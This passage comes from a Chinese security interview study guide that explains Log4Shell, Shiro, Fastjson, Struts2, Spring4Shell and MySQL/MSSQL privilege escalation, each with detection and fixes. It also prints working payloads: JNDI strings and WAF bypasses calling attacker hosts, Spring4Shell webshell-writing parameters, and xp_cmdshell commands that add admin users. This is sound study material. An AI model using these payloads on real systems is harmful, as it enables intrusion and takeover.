# 选择 DNS / URL / Word 文档类型
# 投放至公开网盘 → 一旦访问邮件告警

# 5. 蜜罐识别（Nmap + 指纹）
nmap -sV -p 22 --script ssh-hostkey localhost
# 若 banner 显示 cowrie@... → 是蜜罐

# 6. 红队视角：蜜罐指纹比对
p0f -i eth0  # TCP 指纹识别
# 与蜜罐常见 OS 指纹对比
```

### 第 59 天（精讲） ★★★★★ OWASP Top 10 2017 和 2021 对比


**主题**：Web 安全 / OWASP

**答案**：

**OWASP Top 10 2017**：
- A1 注入（Injection）
- A2 失效的身份认证（Broken Authentication）
- A3 敏感数据泄露（Sensitive Data Exposure）
- A4 XML 外部实体（XXE）
- A5 失效的访问控制（Broken Access Control）
- A6 安全配置错误（Security Misconfiguration）
- A7 跨站脚本（XSS）
- A8 不安全的反序列化（Insecure Deserialization）
- A9 使用含有已知漏洞的组件（Vulnerable Components）
- A10 不足的日志记录和监控（Insufficient Logging）

**OWASP Top 10 2021（重大调整）**：
- A01 访问控制失效（前移整合多个类别）
- A02 加密机制失效（合并敏感数据泄露 + 加密失败）
- A03 注入（包含 SQL/NoSQL/命令注入/XXE）
- A04 不安全设计（新增，覆盖设计阶段缺陷）
- A05 安全配置错误（前移）
- A06 自带缺陷和过时的组件（前移）
- A07 身份认证和识别机制失效（前移并改名）
- A08 软件和数据完整性故障（新增，整合反序列化 + CI/CD）
- A09 安全日志记录和监控失效（改名）
- A10 服务端请求伪造 SSRF（新增独立类别）

**2021 新增重点**：
- SSRF 独立成类（云时代内网访问风险加剧）
- 不安全设计（架构层面的威胁建模）
- 软件完整性（SolarWinds / Codecov 供应链攻击）

**解析**：

考察意图：Web 安全整体认知的"地图"。回答要点：能默写+对比新旧差异。易错点：把 2017 和 2021 混淆。面试官想听到：能讲清新增类别的背景（SSRF 因云架构成为高危、不安全设计因安全左移趋势），理解这是风险演变而非简单排序变化。

**考察知识点**：

- 2017 / 2021 版本对比
- SSRF 独立成类的原因
- 不安全设计新增类别
- 软件完整性故障供应链攻击

---


---

### 第 60 天（精讲） ★★★★ 代码审计主要方法与常见漏洞


**主题**：代码审计 / 审计方法

**答案**：

代码审计（Code Audit）通过对源代码审查发现安全漏洞。

**主要方法**：

**1. 正向追踪（Source to Sink）**：
- 从用户输入入口（$_GET / $_POST / RequestParam）追踪
- 沿数据流经处理函数最终到达危险 sink（SQL 执行/命令执行/文件操作）
- 适合新人按漏洞类型逐条排查

**2. 反向追踪（Sink to Source）**：
- 从危险 sink 点（mysql_query / system）反推数据来源
- 适合有经验的审计员快速发现漏洞

**3. 危险函数定位**：
- 搜索全局危险函数列表
- 分析调用上下文判断是否可达

**4. 自动化工具辅助**：
- SAST（静态应用安全测试）：Fortify、Checkmarx、SonarQube
- IDE 插件：FindBugs、PMD
- 污点分析（Taint Analysis）跟踪用户输入流向

**PHP 常见漏洞**：
1. SQL 注入：`mysql_query("SELECT * FROM user WHERE id=$_GET[id]")`
2. XSS：`echo $_GET['x']` 未编码
3. 文件包含：`include $_GET['file']`
4. 文件上传：`move_uploaded_file` 未校验
5. 命令执行：`system($_GET['cmd'])`
6. 反序列化：`unserialize($_POST)`
7. 越权：`$_GET['user_id']` 未校验
8. SSRF：`file_get_contents($_GET['url'])`

**Java 常见漏洞**：
1. SQL 注入：Statement 拼接 SQL
2. XXE：DocumentBuilderFactory 未禁用 DTD
3. 反序列化：`readObject(ObjectInputStream)`
4. SpEL 注入：`SpelExpressionParser`
5. SSTI：Thymeleaf/Freemarker 未分离逻辑和视图
6. SSRF：URLConnection / HttpClient
7. 任意文件上传：MultipartFile 未校验
8. 硬编码密钥：搜索 key / secret / token

**审计流程**：
1. 了解应用架构（MVC/微服务）
2. 入口文件分析（路由/配置）
3. 全局过滤函数审计
4. 关键模块逐条审查
5. 漏洞验证与利用
6. 输出报告 + 修复建议

**辅助资源**：
- Seay 源代码审计系统
- RIPS（PHP 专用）
- Cobra（PHP/JS）
- semgrep（多语言）
- Vulnhub 靶场练习

**修复建议原则**：
- 输入校验：白名单 + 正则
- 输出编码：HTML/URL/JS 编码
- 参数化查询：PreparedStatement
- 最小权限：账号/进程权限
- 框架安全配置：Spring Security / Shiro

**解析**：

考察意图：考察代码审计能力，是高薪岗位（安全开发/审计员）核心技能。回答要点：要讲清正向+反向+工具辅助三种方法。易错点：只提工具忽视人工审计。面试官想听到：能详细对比 SAST 工具（Fortify vs SonarQube）、污点分析原理（追踪用户输入是否到达危险函数）、PHP/Java 审计时的关键 sink 函数清单。

**考察知识点**：

- 正向追踪 + 反向追踪方法
- SAST 工具 Fortify / SonarQube
- 污点分析原理
- PHP / Java 关键 sink 函数

---


---

### 第 61 天（精讲） ★★★ 代码审计的流程、方法与工具链


**主题**：代码审计 / 审计方法

**答案**：

代码审计（Code Audit）是对源代码进行安全缺陷检查的过程，主流方法分三类：

**1. 黑盒测试（动态）**：
- 无源码情况下渗透测试，发现可利用漏洞
- 工具：Burp / ZAP + sqlmap + 手工
- 优点：贴近真实攻击；缺点：覆盖不全，依赖测试者经验

**2. 白盒测试（静态）**：
- 通读源码 + 工具扫描
- 主流工具：
  - 通用 SAST：Fortify、Checkmarix、SonarQube、Semgrep
  - Java 专用：Find Security Bugs、SpotBugs
  - PHP 专用：RIPS、Seay、CodeQL
  - Python：Bandit
- 优点：覆盖全、能发现深层漏洞

**3. 灰盒测试**：结合两者，业内主流

**代码审计流程（5 阶段）**：
1. **准备阶段**：收集文档、架构图、威胁建模、确定范围
2. **工具扫描**：先用工具过一遍，产出初步漏洞清单
3. **人工通读**：重点审计工具扫不到的业务逻辑漏洞（水平越权、支付篡改等）
4. **漏洞验证**：搭建环境复现，确认可利用性
5. **报告输出**：含复现步骤、危害等级（CVSS）、修复建议

**关键审计点（OWASP Top10 对应）**：
- 注入（SQL/NoSQL/LDAP/OS 命令）— 审计 SQL 拼接、命令拼接
- 失效身份认证（Broken Authentication）— 弱密码策略、JWT 验证、Session 固定
- 敏感数据泄露（Sensitive Data Exposure）— 密钥硬编码、传输未加密
- XXE（XML External Entity）— `DocumentBuilder.parse` 禁用外部实体
- 失效访问控制（Broken Access Control）— IDOR 越权
- 安全配置错误（Security Misconfig）— 默认密码、CORS、目录遍历
- XSS — 输出未编码、CSP 缺失
- 不安全反序列化 — ObjectInputStream、pickle、fastjson
- 已知漏洞组件 — 依赖检查（OWASP Dependency-Check）
- 日志监控不足 — 关键操作未记录

**危险函数速查**：
- PHP：`system` / `exec` / `passthru` / `shell_exec` / `popen` / `eval` / `include` / `require` / `$_GET` / `$_POST` / `$_REQUEST`
- Java：`Runtime.exec` / `ProcessBuilder` / `ObjectInputStream.readObject` / `jdbcTemplate.query("..."+x)`
- Python：`os.system` / `subprocess.call(shell=True)` / `eval` / `exec` / `pickle.loads`

**审计效率提升技巧**：
- 全局搜索危险函数（grep / ripgrep）
- 关注用户输入入口（Controller 层、Web 入口）
- 数据流追踪（taint analysis 污点分析）
- 重点审计鉴权/支付/上传/导入导出模块

**解析**：

考察意图：考察审计体系化能力。回答要点：流程五阶段 + 三类方法 + 危险函数速查。易错点：只背工具不讲人工通读。面试官想听到：能讲清 SAST 工具对比（Fortify 准但慢、Semgrep 快但需写规则）、业务逻辑漏洞（水平越权）只能人工发现。

**考察知识点**：

- SAST vs DAST 工具链
- 危险函数语言速查
- 业务逻辑漏洞人工审计
- 污点分析 taint

---


---

### 第 62 天（精讲） ★★★★ PHP 危险函数与 disable_functions 绕过


**主题**：Web 安全 / PHP

**答案**：

PHP 危险函数分四类：

**1. 代码执行**：
- `eval()`：执行字符串作为 PHP 代码
- `assert()`：PHP 7 前可执行字符串（已修复）
- `preg_replace()` /e 修饰符（PHP 7 已移除）
- `create_function()`：创建匿名函数（PHP 7.2 已废弃，8.0 移除）
- `call_user_func()` / `call_user_func_array()`
- `array_map()` / `array_filter()`

**2. 命令执行**：
- `system()` / `exec()` / `passthru()`
- `shell_exec()` 反引号 `` ` ``
- `popen()` / `proc_open()`
- `pcntl_exec()`
- `putenv()` + `mail()` / `imagick()` LD_PRELOAD 劫持

**3. 文件操作**：
- `file_get_contents()` / `file_put_contents()`
- `fopen()` / `readfile()`
- `move_uploaded_file()`
- `unlink()` / `fwrite()`

**4. 信息泄露**：
- `phpinfo()` / `print_r()` / `var_dump()` / `getenv()`

**disable_functions 绕过（受限环境 getshell）**：
1. **LD_PRELOAD 劫持**：`mail()` 函数 + `putenv()` 触发新进程加载自定义 .so
2. **Apache mod_cgi bypass**：上传 `.htaccess` + 修改 CGI 执行
3. **ImageMagick Ghostscript**：触发命令执行
4. **PHP-FPM SSRF**：gopher:// 攻击 9000 端口
5. **PHP 7.0-7.4 GC 回收机制绕过**（pwn）
6. **扩展 Hook**：自行编译 .so 扩展

**防御**：
- 禁用 eval / assert / system 等危险函数（disable_functions）
- open_basedir 限制目录访问
- 升级 PHP 7.4+（eval 禁用 assert 改进）

**解析**：

考察意图：PHP 安全审计核心。回答要点：分类清楚。易错点：忽视 LD_PRELOAD 等高级绕过手法。面试官想听到：知道 `mail()` 函数 + `putenv()` 组合触发 .so 加载原理，理解为什么禁用 disable_functions 仍能被绕过（系统调用层）。

**考察知识点**：

- 代码/命令/文件/信息四类危险函数
- LD_PRELOAD 劫持原理
- FPM SSRF gopher 攻击
- open_basedir 目录限制

---


---

### 第 63 天（精讲） ★★★★★ 中间件漏洞（Tomcat/JBoss/WebLogic）


**主题**：Web 安全 / 中间件

**答案**：

**Tomcat 漏洞**：
1. 弱口令：admin/admin、tomcat/tomcat 登录后台部署 war 包
2. CVE-2017-12615 PUT 上传：开启 PUT 方法可上传 shell.jsp 到根目录
3. CVE-2020-1938 AJP Ghostcat：AJP 协议 8009 端口可读取 webapp 下任意文件（含 web.xml 敏感配置）
4. War 包部署：通过 `/manager/html` 部署 war 获取 shell

**JBoss 漏洞**：
1. JBoss 4.x/5.x 反序列化漏洞（CVE-2017-7504 / CVE-2017-12149）
2. 未授权访问控制台 `/jmx-console`、`/web-console`
3. War 包部署：`/admin-console` 部署 war
4. JMXInvokerServlet / JBoss MQ JMS 反序列化

**WebLogic 漏洞**：
1. T3 协议反序列化（CVE-2023-21839）：无需认证远程命令执行
2. CVE-2020-14882：管理控制台未授权 RCE（`/console/css/%25%32%25%2e%2e/admin` 登录绕过）
3. CVE-2018-2893：任意文件上传（`/ws_utc/begin.do`）
4. SSRF 漏洞：`uddiexplorer/SearchPublicRegistries.jsp`
5. XMLDecoder 反序列化
6. War 包部署：通过 console 部署 war

**通用检测方法**：
- 端口扫描：8080 / 8443 / 7001 / 1099 / 8009
- 弱口令爆破
- Shodan / FOFA 搜索特定标题
- POC 脚本验证（WebLogicTool、ysoserial）

**防御**：
1. 关闭不必要的 Web 控制台
2. 修改默认口令 + 复杂口令策略
3. 升级到最新版本
4. WAF 部署拦截反序列化 payload
5. 网络 ACL 限制管理端口

**解析**：

考察意图：护网面试高频，几乎必问。回答要点：要分中间件列 CVE。易错点：把不同中间件的漏洞混淆。面试官想听到：能讲清楚 T3 协议（WebLogic 专有）、AJP 协议（Tomcat 专有 8009）、反序列化 payload 特征（`ac ed 00 05` 开头）。

**考察知识点**：

- Tomcat PUT / AJP Ghostcat
- JBoss 反序列化 / 未授权
- WebLogic T3 / CVE-2020-14882
- 弱口令 + war 部署 + 反序列化三大攻击面

---


---

### 第 64 天（精讲） ★★★★★ Log4j2 JNDI 注入漏洞（CVE-2021-44228）


**主题**：漏洞原理与POC / Log4j2

**答案**：

Log4j2（Apache Log4j 2.x）是 Java 生态使用最广的日志框架之一，2021 年 12 月爆出的 RCE 漏洞被称为"Log4Shell"，影响巨大。

**漏洞原理**：
- Log4j2.lookup 模块提供多种 Lookup 替换：
  - `${java:version}` - Java 版本
  - `${env:USER}` - 环境变量
  - `${sys:os.name}` - 系统属性
  - `${jndi:ldap://attacker/exp}` - JNDI 查找（漏洞根源）
- 用户输入的字符串被 Log4j2 作为日志输出时，会触发 Lookup 解析
- JNDI 支持 LDAP / RMI / DNS / CORBA 等协议，可加载远程类

**利用链**：
1. 用户输入含 `${jndi:ldap://attacker.com/Exploit}` → 写入日志
2. Log4j2 解析触发 JNDI 查询 LDAP 服务器
3. 攻击者 LDAP 服务器返回 Reference 指向远程 HTTP 服务器上的恶意 class
4. 目标下载 class 并实例化 → 执行恶意代码

**POC 构造**：
```
${jndi:ldap://attacker.com:1389/Exploit}
${jndi:rmi://attacker.com:1099/Exploit}
${jndi:dns://attacker.com/flag}（DNS 带外探测）
```

**绕过变种（绕 WAF）**：
- `${${lower:j}ndi:ldap://...}`
- `${${::-j}${::-n}${::-d}${::-i}:ldap://...}`
- `${${env:ENV_NAME:-j}ndi:...}`
- `${${::-$${::-j}}ndi:...}`
- 递归绕过：`${${lower:${lower:j}}}${lower:n}${lower:d}${lower:i}}`

**DNSlog 外带探测**：
```
${jndi:dns://${sys:user}.xxx.dnslog.cn}
```
观察 DNS 查询即可确认漏洞。

**漏洞影响版本**：
- Log4j 2.0 ≤ version < 2.17.0
- 2.15.0 初次修复但有 CVE-2021-45046 绕过
- 2.16.0 禁用默认 lookup
- 2.17.0+ 完全修复

**检测**：
1. 工具：Log4j-scan、Log4Shell-vuln-scanner
2. 流量监控：日志中 `${jndi:` 字符串
3. WAF 规则：拦截 `${jndi:` `${lower:` `${upper:` 等
4. 资产指纹：grep "log4j" jar 包版本

**修复**：
1. 升级到 Log4j 2.17.0+
2. 临时缓解：
   - JVM 参数：`-Dlog4j2.formatMsgNoLookups=true`
   - 系统属性：`log4j2.formatMsgNoLookups=true`
   - 删除 JndiLookup 类：`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
3. 部署 RASP 拦截 JNDI 调用
4. 出口流量限制（仅允许可信 LDAP/RMI）

**应急响应**：
- 立即全网排查 Log4j2 版本
- 优先外网系统 + 对外 API
- 验证可利用性：DNSlog 探测
- 升级修复 + 持续监控

**解析**：

考察意图：2021-2022 年最严重的开源漏洞，护网高频考点。回答要点：要讲清 Lookup 机制+JNDI 利用链+绕过手法。易错点：忽视绕过变种（实际 HW 中 WAF 都加了拦截）。面试官想听到：能详细解释为什么 JndiLookup 类删除即可缓解（因为漏洞根因就是这个类加载远程资源）、DNSlog 探测的具体手法、Log4j 2.15.0 的二次绕过（CVE-2021-45046）历史。

**考察知识点**：

- Lookup 替换机制 + JNDI
- LDAP / RMI 远程类加载
- 绕过变种 `${lower:}`
- 删除 JndiLookup 类缓解

---


---

### 第 65 天（精讲） ★★★★★ Shiro 反序列化漏洞（Shiro-550/Shiro-721）


**主题**：漏洞原理与POC / Shiro

**答案**：

Apache Shiro 是 Java 的认证授权框架，RememberMe 功能存在反序列化漏洞：

**Shiro-550（CVE-2016-4437）**：
- 影响版本：Apache Shiro < 1.2.4
- 原理：RememberMe Cookie 使用了硬编码 AES 密钥加密：
  - 默认密钥：`kPH+bIxk5D2deZiIxcaaaA==`
  - 攻击者用此密钥加密恶意序列化数据
  - 服务端反序列化触发 RCE
- 利用流程：
  1. 抓包获取 RememberMe Cookie
  2. ysoserial 生成 CommonsCollections 等 gadget 的序列化 payload
  3. 用硬编码 AES 密钥加密 + Base64 编码
  4. 设置 `Cookie: rememberMe=xxx`
  5. 服务端反序列化触发 RCE
- 工具：ShiroExploit、shiro_attack

**Shiro-721（Padding Oracle Attack）**：
- 影响版本：Apache Shiro < 1.4.2
- 原理：AES-CBC 加密模式可被 Padding Oracle 攻击
- 必要条件：需要已知合法用户 RememberMe Cookie
- 利用流程：
  1. 合法用户登录获取 RememberMe Cookie
  2. 利用 Padding Oracle 漏洞生成任意密文
  3. 解密为恶意序列化 payload
  4. 重放 Cookie 触发 RCE
- 工具：ysoserial + ShiroAttack2
- 爆破时间：数小时到数天

**漏洞识别**：
1. 响应包含 rememberMe 字段（删除后请求仍包含）
2. 异常响应（删除 rememberMe 后响应不同）
3. 响应头 `Set-Cookie: rememberMe=deleteMe`（异常特征）

**密钥爆破**：
- Shiro 使用 AES-CBC 加密
- 默认密钥列表爆破：
  - `kPH+bIxk5D2deZiIxcaaaA==`
  - `4AvVhmFLUs0KTA3Kprsdag==`
  - `Z3VucwAAAAAAAAAAAAAAAA==`
  - 等数十种常见密钥
- 工具：shiro_key_check

**利用条件**：
- Shiro <= 1.2.4 或 1.2.5-1.4.1
- 服务端有可用 gadget 库（commons-collections 等）
- 攻击者可达目标

**修复方案**：
1. 升级 Shiro 到 1.7.0+（最新稳定版）
2. 替换默认 AES 密钥（自定义复杂密钥）
3. 移除 RememberMe 功能（如果不需要）
4. 升级依赖库版本（commons-collections 等）
5. 部署 RASP 拦截反序列化攻击

**HW 常用手法**：
- 批量 FOFA / Shodan 搜索 Shiro 资产
- 弱密钥爆破
- CommonsCollections gadget 利用
- 反序列化 payload 特征：`ac ed 00 05` 开头

**解析**：

考察意图：护网常见漏洞，HW 每年都有大量 Shiro 打点。回答要点：要分清 550 和 721 的区别+利用条件。易错点：把 Shiro-550 和 Shiro-721 混淆（前者硬编码密钥，后者 Padding Oracle）。面试官想听到：能详细说明默认密钥列表（爆破字典）、gadget 依赖（commons-collections 是关键）、为什么 AES-CBC 的 Padding Oracle 可被利用（IV + 密文 + Padding 错误响应差异）。

**考察知识点**：

- Shiro-550 硬编码 AES 密钥
- Shiro-721 Padding Oracle
- 默认密钥字典爆破
- ysoserial CommonsCollections gadget

---


---

### 第 66 天（精讲） ★★★★★ Fastjson 反序列化漏洞原理与 POC


**主题**：漏洞原理与POC / Fastjson

**答案**：

Fastjson 是阿里巴巴开源的 Java JSON 解析库，因 autotype 机制存在反序列化漏洞：

**漏洞原理**：
- `@type` 字段开启 autotype 机制（默认开启至 1.2.47）
- 解析 JSON 时 `@type` 指定的类会被实例化
- 攻击者构造恶意 `@type` 指向危险类

**版本演进**：
- < 1.2.24：存在 JNDI 注入
- 1.2.24-1.2.41：JNDI 黑名单绕过
- 1.2.42-1.2.47：黑名单不断绕过
- 1.2.48+：引入 safeMode，需手工开启才安全
- 1.2.83+：默认安全配置

**经典 POC**：

**JdbcRowSetImpl JNDI 注入**（适用 < 1.2.24）：
```json
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://attacker.com/Exploit",
  "autoCommit":true
}
```
反序列化触发 → setDataSourceName() → JNDI 查找 → 加载远程 class

**TemplatesImpl 字节码**（适用 1.2.22-1.2.47）：
```json
{
  "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes":["base64 编码的恶意 class 字节码"],
  "_name":"a",
  "_tfactory":{},
  "_outputProperties":{}
}
```
需要服务端 FastJSON 解析路径触发 TemplatesImpl 的 getOutputProperties() 方法。

**绕过技巧**：
1. 1.2.25-1.2.41：使用 LdapAttribute 类等黑名单外类
2. 1.2.42+：利用 ClassLoader/Tomcat 依赖
3. 1.2.43-1.2.47：使用 `"a"` 绕过 checkAutoType（`@type:"a";[类名];` 复合类型）
4. 1.2.48+：需开启 safeMode 绕过（实际几乎不可绕）

**黑名单类**：
- javax.naming.*（JNDI 相关）
- com.sun.rowset.JdbcRowSetImpl
- com.sun.org.apache.xalan.*
- TemplatesImpl
- 不断追加……但总有绕过

**检测方法**：
1. 流量特征：`@type` 字段 + 危险类名
2. DNSlog 探测：`@type":"com.sun.rowset.JdbcRowSetImpl"...+dnslog`
3. 反编译检查 Fastjson 版本
4. 工具：fastjsonScan

**修复方案**：
1. 升级到 Fastjson 1.2.83+（或 2.x）
2. 开启 safeMode：
   ```java
   ParserConfig.getGlobalInstance().setSafeMode(true);
   ```
3. 关闭 autotype：
   ```java
   ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
   ```
4. 自定义反序列化白名单
5. 升级 JDK 到 8u191+（trustCodebase 限制）

**HW 打法**：
- 探测 `Content-Type: application/json`
- 注入 `@type` 尝试
- DNSlog 验证
- ysoserial + fastjson gadget
- 配合 Shiro/Log4j 组合利用

**解析**：

考察意图：护网常见漏洞，与 Shiro/Log4j 并列。回答要点：要分版本+绕过链。易错点：不知道安全版本（1.2.83+）。面试官想听到：能详细说明 autotype 机制（`@type` 字段）、JdbcRowSetImpl 利用链（setDataSourceName → JNDI → 加载远程 class）、为什么 1.2.48+ 引入 safeMode（白名单 + 拒绝默认反序列化）。

**考察知识点**：

- `@type` autotype 机制
- JdbcRowSetImpl JNDI
- TemplatesImpl 字节码
- safeMode 白名单防御

---


---

### 第 67 天（精讲） ★★★ Struts2 历史 RCE 漏洞与 OGNL 表达式注入


**主题**：漏洞原理与POC / Struts2

**答案**：

Struts2 是 Java 历史上漏洞最多的框架之一，主要因为引入 OGNL（Object-Graph Navigation Language）作为表达式语言，导致大量 RCE。

**1. OGNL 基础**：
OGNL 是 Apache 的表达式语言，类似 SpEL，支持方法调用、属性访问、静态方法。
```
%{user.name}        // 访问属性
%{@java.lang.Runtime@getRuntime().exec('id')}  // 调用静态方法
```

**2. 经典漏洞时间线**：
- S2-001（2007）：参数名 OGNL 递归求值
- S2-005（2010）：参数拦截器覆盖
- S2-007（2011）：转换错误回显 OGNL
- S2-016（2013）：默认 Action 通配符 `*` 接收 OGNL
- S2-032 / S2-033（2016）：method 任意方法调用
- **S2-045 / S2-046 / S2-048（2017）**：Content-Type 处理 OGNL
  - S2-045：Content-Length 超长触发
  - S2-046：上传文件名 OGNL
  - S2-048：Struts1 插件集成 struts2-Plugin
- S2-052 / S2-053（2017-2018）：REST 插件 XStream 反序列化
- S2-057（2019）：namespace 未配置 OGNL
- S2-059 / S2-061（2020-2021）：沙箱绕过

**3. 经典 POC（S2-045）**：
```http
POST / HTTP/1.1
Content-Type: %{...
... }
```

**4. 绕过历史防御**：
- S2-045 后期修复：过滤 `\u0023`、`%`
- 后续绕过：使用 unicode 编码、十六进制、双重 URL 编码
- 沙箱绕过：通过 `java.lang.ProcessBuilder` 替代 Runtime

**5. 审计/检测要点**：
- Struts2 特征：URL 含 .action / .do、错误页面显示 Struts2 字样
- Shodan 搜索："Struts" in http.title
- 工具：struts2_check（Python 脚本）、nuclei 模板、K8Struts2Exploit

**6. 修复**：
- 升级到 Struts 2.5.30+ / 2.6+
- 启用 strict-method-invocation
- OGNSecuritySandbox 加固（开启沙箱）

**7. 类似 OGNL 注入的还有**：
- Spring SpEL（Spring 表达式）— Spring4Shell 也基于此
- Freemarker 模板注入
- Thymeleaf SSTI
- Velocity SSTI
- EL 表达式注入（Resin、Tomcat）

**解析**：

考察意图：考察 Java 框架漏洞史。回答要点：OGNL 是万恶之源 + S2-045 经典 POC。易错点：说不清 OGNL 表达式如何被攻击者控制。面试官想听到：能讲清 S2-045 / S2-046 / S2-061 三个里程碑、OGNL 沙箱绕过历史、Struts2 vs Spring SpEL vs Freemarker SSTI 对比。

**考察知识点**：

- OGNL 表达式注入原理
- S2-045 / 046 / 061 演进
- 沙箱绕过方法
- OGNL / SpEL / Freemarker 对比

---


---

### 第 68 天（精讲） ★★★ Spring4Shell（CVE-2022-22965）漏洞原理与利用


**主题**：漏洞原理与POC / Spring4Shell

**答案**：

Spring4Shell 是 2022 年 3 月爆出的 Spring 框架 RCE，CVSS 9.8，与 Log4Shell 同月爆发影响巨大。

**1. 受影响版本**：
- Spring Framework 5.3.0 - 5.3.17
- Spring Framework 5.2.0 - 5.2.19
- **JDK ≥ 9**（必须 JDK9+，因利用 module 相关特性）
- Spring 部署为 WAR（Tomcat）

**2. 漏洞原理**：
Spring MVC 在参数绑定时，会将 HTTP 参数映射到 POJO 对象的属性。漏洞点在于 Class 对象被作为参数传入时，Spring 会递归地通过 setter/getter 遍历 Class 的 module，进而访问 module 的内部数据结构。

触发条件：
1. 控制器方法形参为 POJO（@ModelAttribute 或默认）
2. POJO 有 public 字段或 getter/setter
3. 通过构造特殊参数名访问 `class.module.classLoader`

**3. 利用链**：
```
class.module.classLoader.DefaultAssertionStatus=true
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

**4. 攻击步骤**：
1. 探测 Spring 应用（X-Application-Context 头、404 页面图标）
2. 探测 POJO 形参接口（`/hello?name=test`）
3. 构造 URL 编码 payload 访问 `class.module.classLoader`
4. Tomcat AccessLogValve 参数被修改
5. 日志写到 `webapps/ROOT/shell.jsp`
6. 访问 shell.jsp 执行命令

**5. 修复**：
- 升级 Spring 5.3.18+ / 5.2.20+
- 临时方案：
  - 升级到 JDK 8（不支持 module）
  - 修改 Controller 避免使用 POJO 形参
  - 在 Filter 中过滤 `class.module` 关键字

**6. 衍生漏洞**：
- Spring Cloud Function SpEL 注入（CVE-2022-22963）
- Spring Cloud Gateway SpEL（CVE-2022-22947）
- 三者同月爆出称"Spring 全家桶"，护网高频考点

**7. POC 工具**：
- GitHub 公开 POC：spring4shell-poc
- 集成到 Goby / Xray / nuclei 模板
- Burp 插件支持

**解析**：

考察意图：经典 RCE 必考。回答要点：JDK9+ 依赖 + 参数绑定 + AccessLogValve 写入。易错点：讲不清 module 遍历链。面试官想听到：能讲清 JDK8 不受影响（无 module）、与 Log4Shell 同期爆发的"三月漏洞月"、Spring 全家桶三个 CVE 对比。

**考察知识点**：

- JDK9+ module 特性
- 参数绑定访问 class.module
- AccessLogValve 写 JSP
- Spring 全家桶三连 CVE

---


---

### 第 69 天（精讲） ★★★★ MySQL UDF/MOF 提权原理


**主题**：操作系统与提权 / 数据库提权

**答案**：

MySQL 提权利用数据库的高权限执行系统命令：

**MySQL UDF 提权（User Defined Function）**：
- 原理：MySQL 允许用户自定义函数，通过上传 C/C++ 编写的 .dll/.so 扩展，可调用系统命令
- 步骤：
  1. 上传 lib_mysqludf_sys 到 plugin 目录
     - MySQL 5.1+：`@@plugin_dir`
     - MySQL < 5.1：上传到 `C:\Windows\System32`（默认搜索路径）
  2. 注册函数：
     ```sql
     CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll'
     ```
  3. 调用执行：`SELECT sys_eval('whoami')`
- sys_eval：执行命令并返回结果
- sys_exec：执行命令返回 exit code
- 必要条件：
  - FILE 权限（LOAD DATA 或 SELECT INTO OUTFILE）
  - plugin_dir 可写
  - secure_file_priv 为空
- MySQL 8.0+：库文件改名 `lib_mysqludf_sys_64.so` 等

**MySQL MOF 提权**：
- 原理：Mof 文件（Managed Object Format）每分钟被 WMI 服务加载，可执行 VBScript
- 利用：
  1. 上传 nullevt.mof 到 `C:\Windows\System32\wbem\mof\` 目录
  2. WMI 服务每分钟加载执行
  3. mof 文件中嵌入 VBScript 反弹 shell
- 必要条件：
  - FILE 权限
  - 系统权限（SYSTEM 运行 WMI 服务）
  - MySQL < 6.0 版本
- 限制：仅 Windows 系统，影响小

**防御**：
1. 数据库账号最小权限，禁止 FILE/Process/Super 权限
2. secure_file_priv 限制为 NULL 或指定目录
3. 限制 plugin_dir 目录权限
4. MySQL 升级到 5.7+/8.0
5. 数据库账号独立，与应用分离
6. 数据库服务器不应直接暴露公网

**解析**：

考察意图：数据库提权经典手法，几乎必问。回答要点：要讲清利用链和必要条件。易错点：忽视 secure_file_priv 限制（MySQL 5.7+ 默认开启）。面试官想听到：能详细说明 sys_eval 函数注册过程（SONAME 参数）、MOF 每分钟加载的特性（区别于 UDF 的一次性利用）、MySQL 8.0+ 路径变化（plugin_dir 定位）。

**考察知识点**：

- UDF lib_mysqludf_sys 扩展
- sys_eval 注册执行命令
- MOF 每分钟 WMI 加载
- secure_file_priv 限制

---


---

### 第 70 天（精讲） ★★★ MSSQL 数据库提权与命令执行方法


**主题**：数据库安全 / MSSQL 提权

**答案**：

MSSQL sa 权限是 Windows 渗透的常见突破点，前提是已获取 sa 账号密码（弱口令爆破 / 注入 / 配置文件泄漏）。

**1. xp_cmdshell 命令执行（最常用）**：
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add && net localgroup administrators hacker /add';
```

**2. xp_cmdshell 被删除时恢复**：
```sql
EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'
```

**3. sp_oacreate 执行命令（无 xp_cmdshell）**：
```sql
DECLARE @s INT; EXEC sp_oacreate 'wscript.shell',@s OUT;
EXEC sp_oamethod @s,'run',NULL,'cmd /c whoami > C:\out.txt';
```

**4. OpenRowSet 外联（出网探测/数据回传）**：
```sql
SELECT * FROM OpenRowSet('SQLOLEDB','uid=sa;pwd=xxx;Network=DBMSSOCN;Address=attacker_ip,80;','SELECT 1')
```

**5. CLR Assembly 加载自定义 DLL**：
```sql
EXEC sp_configure 'clr enabled',1; RECONFIGURE;
CREATE ASSEMBLY myasm FROM 0x4D5A... WITH PERMISSION_SET=UNSAFE;
CREATE PROCEDURE cmd AS EXTERNAL NAME myasm.StoredProcs.Run;
EXEC cmd;
```

**6. 提权链路**：拿到 sa → xp_cmdshell → 服务账号权限 → mimikatz 抓密码 → 服务账号若是域用户 → DCSync → 黄金票据控制全域。

**防御**：强 sa 密码、不开放 1433 到公网、应用账号最小权限（db_owner 而非 sa）、禁用 xp_cmdshell、DDL 触发器审计。

**解析**：

考察意图：数据库提权是实操高频题。回答要点：xp_cmdshell 启用步骤 + 被删后恢复 + sp_oacreate 替代方案。易错点：忘写 sp_configure 提前开启。面试官想听到：能讲清从 sa 到域控的完整链路（服务账号 → mimikatz → DCSync → 黄金票据）。

**考察知识点**：

- xp_cmdshell 启用三步
